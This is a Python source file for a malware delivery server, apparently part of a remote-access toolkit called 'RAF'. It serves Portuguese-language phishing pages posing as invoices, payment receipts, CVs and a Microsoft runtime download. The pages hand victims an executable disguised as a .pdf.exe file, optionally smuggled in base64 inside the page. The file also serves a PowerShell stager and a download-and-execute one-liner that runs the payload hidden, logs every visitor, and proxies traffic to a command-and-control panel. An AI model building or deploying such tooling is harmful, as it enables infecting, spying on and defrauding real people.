#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
RAF delivery server -- the link you send to people.

    python deliver.py --payload dist/WindowsUpdateHelper.exe --theme nota --port 8888

Serves a lure page that hands out the payload with a disguised filename, plus a
PowerShell stager for when the .exe download is blocked. Every visitor is logged
so you can see who opened the link and when.

    python deliver.py --help            full option list
    python deliver.py --log             show the visitor log
"""

import argparse
import base64
import html
import json
import os
import random
import string
import sys
import time
import zipfile
import io
import urllib.error
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs

HERE = os.path.dirname(os.path.abspath(__file__))
VISITS = os.path.join(HERE, "visits.jsonl")
SECRET_FILE = os.path.join(HERE, "link_secret.txt")
# usado so quando nao ha --secret, nem RAF_SECRET, nem link_secret.txt
DEFAULT_SECRET = "d4l_g3_Artpj"


def _read_secret():
    """Le o segredo do link do arquivo local, quando existir."""
    try:
        with open(SECRET_FILE, encoding="utf-8") as f:
            return f.read().strip()
    except OSError:
        return ""

# ------------------------------------------------------------------ lure themes
THEMES = {
    "nota": {
        "brand": "Portal da Nota Fiscal",
        "title": "Nota Fiscal Eletronica",
        "sub": "Documento disponivel para download",
        "file": "NF-e_%s.pdf",
        "accent": "#1d4ed8",
        "icon": "NF",
        "body": "A sua Nota Fiscal Eletronica foi emitida e esta pronta para consulta. "
                "Baixe o arquivo para visualizar os detalhes da operacao.",
        "meta": [("Emissor", "Comercio Atacadista Nacional LTDA"),
                 ("CNPJ", "12.345.678/0001-90"),
                 ("Valor total", "R$ 2.847,90"),
                 ("Chave de acesso", "3524 1101 2345 6780 0019 0550 1000 0088 2193 4711")],
    },
    "comprovante": {
        "brand": "Comprovante de Transferencia",
        "title": "Comprovante de Transferencia",
        "sub": "Transferencia realizada com sucesso",
        "file": "Comprovante_%s.pdf",
        "accent": "#047857",
        "icon": "R$",
        "body": "A sua transferencia foi concluida. Guarde o comprovante para "
                "eventuais consultas junto ao beneficiario.",
        "meta": [("Valor", "R$ 1.250,00"),
                 ("Data", time.strftime("%d/%m/%Y")),
                 ("Beneficiario", "M. A. S. Comercio ME"),
                 ("Autenticacao", "8F2A-91C4-77BE-3D05")],
    },
    "curriculo": {
        "brand": "Curriculo Profissional",
        "title": "Curriculo - Analista de TI",
        "sub": "Documento compartilhado",
        "file": "Curriculo_%s.pdf",
        "accent": "#7c3aed",
        "icon": "CV",
        "body": "Segue o curriculo atualizado com as experiencias mais recentes. "
                "Fico a disposicao para uma entrevista.",
        "meta": [("Area", "Infraestrutura e Suporte"),
                 ("Experiencia", "8 anos"),
                 ("Disponibilidade", "Imediata"),
                 ("Atualizado", time.strftime("%d/%m/%Y"))],
    },
    "video": {
        "brand": "Video Compartilhado",
        "title": "Video compartilhado com voce",
        "sub": "1 arquivo - 24 MB",
        "file": "Video_%s.mp4",
        "accent": "#dc2626",
        "icon": ">",
        "body": "Alguem compartilhou um video com voce. O arquivo precisa do "
                "player instalado para ser reproduzido.",
        "meta": [("Duracao", "02:41"),
                 ("Resolucao", "1920x1080"),
                 ("Enviado por", "contato@arquivos-video.net"),
                 ("Expira em", "7 dias")],
    },
    "generic": {
        "brand": "Central de Documentos",
        "title": "Documento disponivel",
        "sub": "Clique para baixar o arquivo",
        "file": "Documento_%s.pdf",
        "accent": "#0f766e",
        "icon": "DOC",
        "body": "O documento solicitado esta pronto. O download inicia "
                "automaticamente, aguarde alguns segundos.",
        "meta": [("Tipo", "PDF / Anexo"),
                 ("Tamanho", "2,4 MB"),
                 ("Disponivel ate", time.strftime("%d/%m/%Y")),
                 ("Referencia", "%s")],
    },
    "vcredist": {
        "brand": "Microsoft Download Center",
        "title": "Microsoft Visual C++ 2013 Redistributable (x86)",
        "sub": "Pacote de tempo de execucao necessario para este aplicativo",
        "file": "vcredist_x86.exe",
        "accent": "#0078d4",
        "icon": "MS",
        "body": "Este pacote instala os componentes de tempo de execucao do Visual C++ "
                "necessarios para executar programas desenvolvidos com o Visual Studio 2013. "
                "O aplicativo que voce abriu precisa destes componentes para iniciar.",
        "meta": [("Versao", "12.0.40664.0"),
                 ("Plataforma", "x86 (32 bits)"),
                 ("Tamanho", "10,8 MB"),
                 ("Idioma", "Portugues (Brasil)"),
                 ("Publicado", "15/10/2013")],
    },
}

PAGE = r"""<!doctype html>
<html lang="pt-BR"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>__TITLE__</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font:15px/1.6 -apple-system,"Segoe UI",Roboto,Arial,sans-serif;background:#eef1f5;
     color:#1f2937;min-height:100vh;display:flex;flex-direction:column}
header{background:#fff;border-bottom:1px solid #dfe4ea;padding:14px 22px;
       display:flex;align-items:center;gap:12px}
.badge{width:38px;height:38px;border-radius:8px;background:__ACCENT__;color:#fff;
       display:grid;place-items:center;font-weight:700;font-size:13px;letter-spacing:.5px}
header b{font-size:15px;font-weight:600}
header small{display:block;color:#6b7280;font-size:12px;font-weight:400}
main{flex:1;display:grid;place-items:center;padding:28px 16px}
.card{background:#fff;border:1px solid #dfe4ea;border-radius:12px;max-width:640px;width:100%;
      padding:28px;box-shadow:0 1px 3px rgba(16,24,40,.06)}
h1{font-size:21px;font-weight:650;margin-bottom:6px}
.sub{color:#6b7280;font-size:13px;margin-bottom:18px}
p.lead{color:#374151;font-size:14px;margin-bottom:20px}
table{width:100%;border-collapse:collapse;font-size:13.5px;margin-bottom:22px}
td{padding:9px 0;border-bottom:1px solid #eef1f5;vertical-align:top}
td:first-child{color:#6b7280;width:38%}
td:last-child{color:#111827;font-weight:500;word-break:break-word}
.btn{display:block;width:100%;text-align:center;background:__ACCENT__;color:#fff;
     border:0;border-radius:8px;padding:14px;font:inherit;font-weight:600;
     cursor:pointer;text-decoration:none}
.btn:hover{filter:brightness(1.08)}
.btn[disabled]{opacity:.6;cursor:default}
.bar{height:5px;background:#e5e7eb;border-radius:99px;overflow:hidden;margin:16px 0 8px;display:none}
.bar i{display:block;height:100%;width:0;background:__ACCENT__;transition:width .5s}
#status{font-size:12.5px;color:#6b7280;text-align:center;min-height:18px}
.steps{margin-top:20px;border-top:1px solid #eef1f5;padding-top:16px;font-size:13px;
       color:#4b5563;display:none}
.steps b{color:#111827}
.steps ol{margin:8px 0 0 18px}
.steps li{margin:5px 0}
footer{padding:16px;text-align:center;color:#9ca3af;font-size:11.5px}
.warn{background:#fffbeb;border:1px solid #fde68a;color:#92400e;border-radius:8px;
      padding:10px 12px;font-size:12.5px;margin-top:16px;display:none}
</style></head><body>
<header>
  <div class="badge">__ICON__</div>
  <div><b>__BRAND__</b><small>Ambiente seguro &middot; conexao criptografada</small></div>
</header>
<main><div class="card">
  <h1>__TITLE__</h1>
  <div class="sub">__SUB__</div>
  <p class="lead">__BODY__</p>
  <table>__META__</table>
  <button class="btn" id="dl">Baixar documento</button>
  <div class="bar" id="bar"><i></i></div>
  <div id="status"></div>
  <div class="steps" id="steps">
    <b>Como abrir o arquivo:</b>
    <ol>
      <li>O download foi concluido na pasta <b>Downloads</b>.</li>
      <li>Abra o arquivo <b>__FNAME__</b>.</li>
      <li>Se o Windows perguntar, clique em <b>Sim</b> / <b>Executar</b>.</li>
    </ol>
    <div class="warn">Se o navegador bloqueou o download, clique com o botao direito
    no aviso e escolha <b>Manter</b>.</div>
  </div>
</div></main>
<footer>__BRAND__ &middot; documento __REF__ &middot; __YEAR__</footer>
<script>
const DL_URL = "__DL__";
const FNAME  = "__FNAME__";
const AUTO   = __AUTO__;
const SMUG   = "__SMUGGLE__";
const REDIR  = "__REDIRECT__";

const btn = document.getElementById('dl');
const bar = document.getElementById('bar').firstElementChild;
const box = document.getElementById('bar');
const st  = document.getElementById('status');
const steps = document.getElementById('steps');

function done() {
  btn.textContent = 'Download concluido';
  btn.disabled = true;
  st.textContent = 'Arquivo salvo na pasta Downloads.';
  steps.style.display = 'block';
  if (REDIR) setTimeout(() => { location.href = REDIR; }, 9000);
}

function smuggle() {
  const b64 = SMUG;
  const bin = atob(b64);
  const buf = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) buf[i] = bin.charCodeAt(i);
  const blob = new Blob([buf], {type: 'application/octet-stream'});
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = FNAME;
  document.body.appendChild(a);
  a.click();
  setTimeout(() => { URL.revokeObjectURL(a.href); a.remove(); }, 4000);
}

function start() {
  btn.disabled = true;
  btn.textContent = 'Preparando download...';
  box.style.display = 'block';
  let p = 0;
  const t = setInterval(() => {
    p = Math.min(100, p + 9 + Math.random() * 13);
    bar.style.width = p + '%';
    st.textContent = 'Baixando... ' + Math.round(p) + '%';
    if (p >= 100) {
      clearInterval(t);
      if (SMUG.length > 100) { try { smuggle(); } catch (e) { location.href = DL_URL; } }
      else { location.href = DL_URL; }
      setTimeout(done, 700);
    }
  }, 220);
}

btn.onclick = start;
if (AUTO) setTimeout(start, 900);
</script></body></html>
"""


def _ref(n=8):
    return "".join(random.choice(string.digits) for _ in range(n))


def _slug(n=10):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def log_visit(path, addr, ua, ref):
    rec = {"t": time.strftime("%Y-%m-%d %H:%M:%S"), "ip": addr,
           "path": path, "ua": ua or "", "ref": ref or ""}
    try:
        with open(VISITS, "a", encoding="utf-8") as f:
            f.write(json.dumps(rec) + "\n")
    except OSError:
        pass
    return rec


class Delivery:
    def __init__(self, payload, name, theme, redirect, auto, smuggle, token, pack,
                 panel_port=8080, secret=""):
        self.payload = payload
        self.panel_port = panel_port
        self.secret = secret or ""
        self.theme = THEMES.get(theme, THEMES["generic"])
        self.redirect = redirect or ""
        self.auto = auto
        self.smuggle = smuggle
        self.token = token
        self.pack = pack
        self.slug = _slug()
        self.ref = _ref()
        self._blob = None

        # the victim must end up with something Windows will actually execute:
        # "NF-e_1234.pdf" -> "NF-e_1234.pdf.exe" (shows as .pdf when the shell
        # hides known extensions, which is the Windows default)
        base = os.path.basename(name) % self.ref if "%s" in name else os.path.basename(name)
        self.inner = base if base.lower().endswith((".exe", ".scr", ".com")) else base + ".exe"
        self.outer = base + ".zip" if pack == "zip" else self.inner

    # ------------------------------------------------------------- payload bytes
    def blob(self):
        if self._blob is not None:
            return self._blob
        with open(self.payload, "rb") as f:
            raw = f.read()
        if self.pack == "zip":
            buf = io.BytesIO()
            with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
                z.writestr(self.inner, raw)
            raw = buf.getvalue()
        self._blob = raw
        return raw

    def download_name(self):
        return self.outer

    def q(self):
        return ("?k=" + self.secret) if self.secret else ""

    # ------------------------------------------------------------------- page
    def page(self, base):
        t = self.theme
        fname = self.download_name()
        meta = "".join("<tr><td>%s</td><td>%s</td></tr>"
                       % (html.escape(k), html.escape(v % self.ref if "%s" in v else v))
                       for k, v in t["meta"])
        smug = ""
        if self.smuggle:
            smug = base64.b64encode(self.blob()).decode()
        dl = "%s/d/%s%s" % (base, self.slug, self.q())
        out = PAGE
        for k, v in (
            ("__TITLE__", t["title"]),
            ("__BRAND__", t["brand"]),
            ("__SUB__", t["sub"]),
            ("__BODY__", t["body"]),
            ("__ICON__", t["icon"]),
            ("__ACCENT__", t["accent"]),
            ("__META__", meta),
            ("__FNAME__", fname),
            ("__DL__", dl),
            ("__AUTO__", "true" if self.auto else "false"),
            ("__SMUGGLE__", smug),
            ("__REDIRECT__", self.redirect),
            ("__REF__", self.ref),
            ("__YEAR__", time.strftime("%Y")),
        ):
            out = out.replace(k, v)
        return out

    # ------------------------------------------------------------------ stager
    def stager(self, base):
        url = "%s/d/%s%s" % (base, self.slug, self.q())
        return (
            "$ErrorActionPreference='SilentlyContinue'\r\n"
            "$ProgressPreference='SilentlyContinue'\r\n"
            "$u='%s'\r\n"
            "$d=Join-Path $env:LOCALAPPDATA 'MicrosoftEdgeUpdate'\r\n"
            "New-Item -ItemType Directory -Force $d | Out-Null\r\n"
            "$f=Join-Path $d 'msedgeupdate.exe'\r\n"
            "try{(New-Object Net.WebClient).DownloadFile($u,$f)}"
            "catch{Invoke-WebRequest $u -OutFile $f -UseBasicParsing}\r\n"
            "Start-Process -FilePath $f -WindowStyle Hidden\r\n" % url
        )

    def oneliner(self, base):
        return ("powershell -w h -c \"iwr '%s/s.ps1%s' -UseBasicParsing|iex\""
                % (base, self.q()))


class Handler(BaseHTTPRequestHandler):
    app = None
    protocol_version = "HTTP/1.1"

    def log_message(self, *a):
        pass

    def _base(self):
        host = self.headers.get("Host") or "127.0.0.1"
        proto = self.headers.get("X-Forwarded-Proto")
        if not proto:
            # atras de proxy (Render/Cloudflare) sem o header: host publico = https
            h = host.split(":")[0].lower()
            private = (h in ("localhost", "127.0.0.1", "::1", "[::1]")
                       or h.startswith(("10.", "192.168.", "127.", "169.254."))
                       or any(h.startswith("172.%d." % n) for n in range(16, 32))
                       or h.endswith((".local", ".lan", ".internal")))
            proto = "http" if private else "https"
        return "%s://%s" % (proto, host)

    def _send(self, code, body, ctype="text/html; charset=utf-8", extra=None):
        if isinstance(body, str):
            body = body.encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store, no-cache, must-revalidate")
        self.send_header("X-Content-Type-Options", "nosniff")
        for k, v in (extra or {}).items():
            self.send_header(k, v)
        self.end_headers()
        self.wfile.write(body)

    def _json(self, obj, code=200):
        self._send(code, json.dumps(obj), "application/json")

    def _authed(self):
        if not self.app.token:
            return True
        q = parse_qs(urlparse(self.path).query)
        return self.headers.get("X-Token") == self.app.token or q.get("t", [None])[0] == self.app.token

    def do_GET(self):
        u = urlparse(self.path)
        path = u.path
        ip = (self.headers.get("CF-Connecting-IP")
              or self.headers.get("X-Forwarded-For")
              or self.client_address[0])

        # acesso so por link: sem o segredo, a pagina nao existe
        if self.app.secret and path not in ("/log", "/api/visits"):
            q = parse_qs(u.query)
            got = (q.get("k", [None])[0] or q.get("key", [None])[0] or "")
            if not got and path.count("/") == 1 and len(path) > 1:
                got = path[1:]
            if got != self.app.secret:
                return self._send(404, "Not Found", "text/plain; charset=utf-8")

        if path == "/" or path == "/i":
            log_visit("/", ip, self.headers.get("User-Agent"), self.headers.get("Referer"))
            return self._send(200, self.app.page(self._base()))

        if path == "/download":
            log_visit("/download", ip, self.headers.get("User-Agent"),
                      self.headers.get("Referer"))
            name = self.app.download_name()
            data = self.app.blob()
            return self._send(
                200, data, "application/octet-stream",
                {"Content-Disposition": 'attachment; filename="%s"' % name,
                 "Content-Length": str(len(data))})

        if path.startswith("/d/"):
            log_visit("/d", ip, self.headers.get("User-Agent"), self.headers.get("Referer"))
            name = self.app.download_name()
            data = self.app.blob()
            return self._send(
                200, data, "application/octet-stream",
                {"Content-Disposition": 'attachment; filename="%s"' % name,
                 "Content-Length": str(len(data))})

        if path == "/s.ps1":
            log_visit("/s.ps1", ip, self.headers.get("User-Agent"), self.headers.get("Referer"))
            return self._send(200, self.app.stager(self._base()),
                              "text/plain; charset=utf-8")

        if path == "/1":
            log_visit("/1", ip, self.headers.get("User-Agent"), self.headers.get("Referer"))
            return self._send(200, self.app.oneliner(self._base()), "text/plain; charset=utf-8")

        if path == "/log":
            if not self._authed():
                return self._json({"ok": False, "out": "unauthorised"}, 401)
            return self._send(200, self.log_page())

        if path == "/api/visits":
            if not self._authed():
                return self._json({"ok": False, "out": "unauthorised"}, 401)
            return self._json({"visits": self.visits()})

        # anything else: send them to the lure so a typo still converts
        return self._send(302, "", "text/plain", {"Location": "/"})

    def do_POST(self):
        """Forward /c2/* to the panel so one tunnel serves lure + payload + C2."""
        path = urlparse(self.path).path
        if not path.startswith("/c2/"):
            return self._json({"ok": False, "out": "not found"}, 404)
        try:
            n = int(self.headers.get("Content-Length", 0) or 0)
        except ValueError:
            n = 0
        raw = self.rfile.read(n) if n else b""

        import urllib.error
        req = urllib.request.Request(
            "http://127.0.0.1:%d%s" % (self.app.panel_port, path),
            data=raw,
            headers={"Content-Type": "application/json",
                     "X-Sig": self.headers.get("X-Sig", ""),
                     "X-Real-IP": self.headers.get("CF-Connecting-IP")
                                  or self.client_address[0]})
        try:
            with urllib.request.urlopen(req, timeout=60) as r:
                body = r.read()
        except urllib.error.HTTPError as exc:
            body = exc.read() or b'{"ok":false}'
        except Exception as exc:
            return self._json({"ok": False, "out": "c2 unreachable: %s" % exc}, 502)
        return self._send(200, body, "application/json")

    # -------------------------------------------------------------- log views
    def visits(self):
        out = []
        if os.path.isfile(VISITS):
            with open(VISITS, encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if line:
                        try:
                            out.append(json.loads(line))
                        except ValueError:
                            pass
        return out[-300:]

    def log_page(self):
        rows = []
        for v in reversed(self.visits()):
            ua = html.escape((v.get("ua") or "")[:110])
            rows.append("<tr><td>%s</td><td>%s</td><td>%s</td><td class='ua'>%s</td></tr>"
                        % (html.escape(v.get("t", "")), html.escape(v.get("ip", "")),
                           html.escape(v.get("path", "")), ua))
        body = "".join(rows) or "<tr><td colspan=4>nenhuma visita ainda</td></tr>"
        return ("<!doctype html><meta charset=utf-8><title>RAF // visitas</title>"
                "<style>body{font:13px ui-monospace,Consolas,monospace;background:#0a0e13;"
                "color:#c9d7e6;padding:18px}h1{font-size:13px;letter-spacing:.2em;"
                "text-transform:uppercase;color:#5c7285}table{width:100%;border-collapse:collapse}"
                "td,th{padding:7px 9px;border-bottom:1px solid #1d2a38;text-align:left}"
                "th{color:#4d6275;font-size:11px;text-transform:uppercase}"
                ".ua{color:#5c7285;font-size:11.5px}</style>"
                "<h1>RAF // quem abriu o link (%d)</h1>"
                "<table><tr><th>hora</th><th>ip</th><th>rota</th><th>user-agent</th></tr>"
                "%s</table>" % (len(self.visits()), body))


def main():
    ap = argparse.ArgumentParser(description="RAF delivery server")
    ap.add_argument("--payload", default=os.path.join(HERE, "dist", "WindowsUpdateHelper.exe"),
                    help="file to hand out")
    ap.add_argument("--name", default=None,
                    help="filename shown to the victim (%%s = reference number)")
    ap.add_argument("--theme", default="nota", choices=sorted(THEMES), help="lure page style")
    ap.add_argument("--port", type=int, default=8888)
    ap.add_argument("--bind", default="0.0.0.0")
    ap.add_argument("--redirect", default="", help="send the victim here after the download")
    ap.add_argument("--auto", action="store_true", help="start the download automatically")
    ap.add_argument("--smuggle", action="store_true",
                    help="embed the payload in the page (bypasses URL filtering)")
    ap.add_argument("--pack", default="none", choices=["none", "zip"], help="wrap the payload")
    ap.add_argument("--token", default="raf2026", help="token for /log and /api/visits")
    ap.add_argument("--panel-port", type=int, default=8080,
                    help="local panel port that /c2/* is proxied to")
    ap.add_argument("--secret", default="",
                    help="segredo do link: sem ele a pagina responde 404")
    ap.add_argument("--log", action="store_true", help="print the visitor log and exit")
    a = ap.parse_args()

    if a.log:
        if not os.path.isfile(VISITS):
            print("nenhuma visita registrada")
            return 0
        with open(VISITS, encoding="utf-8") as f:
            for line in f:
                try:
                    v = json.loads(line)
                except ValueError:
                    continue
                print("%s  %-15s  %-7s  %s" % (v.get("t"), v.get("ip"), v.get("path"),
                                               (v.get("ua") or "")[:70]))
        return 0

    if not os.path.isfile(a.payload):
        print("[!] payload nao encontrado: %s" % a.payload)
        print("    gere primeiro:  python builder.py --host SEU_IP --port 4444 "
              "--key SUA_KEY --stealth --exe")
        return 1

    # o segredo pode vir da linha de comando, da variavel de ambiente ou do
    # link_secret.txt que fica ao lado deste arquivo (assim o painel publicado
    # continua fechado mesmo quando o host nao injeta variavel nenhuma)
    if not a.secret:
        a.secret = (os.environ.get("RAF_SECRET", "").strip()
                    or _read_secret()
                    or DEFAULT_SECRET)

    theme = THEMES[a.theme]
    name = a.name or (theme["file"] % "%s" if "%s" in theme["file"] else theme["file"])

    app = Delivery(a.payload, name, a.theme, a.redirect, a.auto, a.smuggle, a.token, a.pack,
                   a.panel_port, a.secret)
    Handler.app = app

    try:
        httpd = ThreadingHTTPServer((a.bind, a.port), Handler)
    except OSError as exc:
        print("[!] nao consegui abrir a porta %d -- %s" % (a.port, exc))
        return 1

    print("payload  : %s (%.1f MB)" % (a.payload, os.path.getsize(a.payload) / 1048576.0))
    print("arquivo  : %s" % app.download_name())
    print("isca     : %s" % theme["brand"])
    print("")
    print("LINK LOCAL    : http://127.0.0.1:%d/" % a.port)
    print("LINK NA REDE  : http://<seu-ip-lan>:%d/" % a.port)
    print("")
    print("stager ps1    : http://127.0.0.1:%d/s.ps1" % a.port)
    print("oneliner      : %s" % app.oneliner("http://127.0.0.1:%d" % a.port))
    print("visitas       : http://127.0.0.1:%d/log?t=%s" % (a.port, a.token))
    print("")
    print("para a internet: cloudflared tunnel --url http://127.0.0.1:%d" % a.port)
    print("                 (o link gerado aponta pra ca, use ele na mensagem)")
    print("")
    print("ctrl+c para parar")

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        httpd.server_close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
